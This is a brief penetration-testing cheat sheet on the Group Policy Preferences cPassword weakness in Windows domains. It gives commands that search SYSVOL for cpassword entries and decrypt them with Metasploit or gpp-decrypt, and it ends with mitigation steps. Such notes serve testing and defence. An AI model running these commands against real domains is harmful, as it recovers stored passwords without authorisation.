# GPP / cPassword Attack

## What Is It?

Group Policy Preferences (GPP) allowed admins to embed credentials in XML policy files pushed to domain machines. Microsoft accidentally released the AES encryption key used, making all stored passwords trivially decryptable.

- Patched in **MS14-025** - but patching does not delete existing files
- Files may still exist on old/unpatched DCs
- Still regularly found on real pentests

---

## Finding cPassword Files

```sh
# Search SYSVOL for Groups.xml with cPassword
findstr /S /I cpassword \\<DC>\SYSVOL\*.xml

# From Linux
smbclient //<DC>/SYSVOL -U 'domain\user%pass'
find . -name "*.xml" -exec grep -l cpassword {} \;
```

---

## Decrypting the Password

### Automated (Metasploit)
```
use post/windows/gather/credentials/gpp
```

### Manual (gpp-decrypt)
```sh
gpp-decrypt <encrypted-cpassword-string>
```

### Online
The AES key is publicly known - any gpp-decrypt tool works.

---

## Mitigation

- Patch all systems (MS14-025 prevents new GPP passwords)
- **Manually delete** old Groups.xml files from SYSVOL
- Audit SYSVOL for any remaining cPassword entries
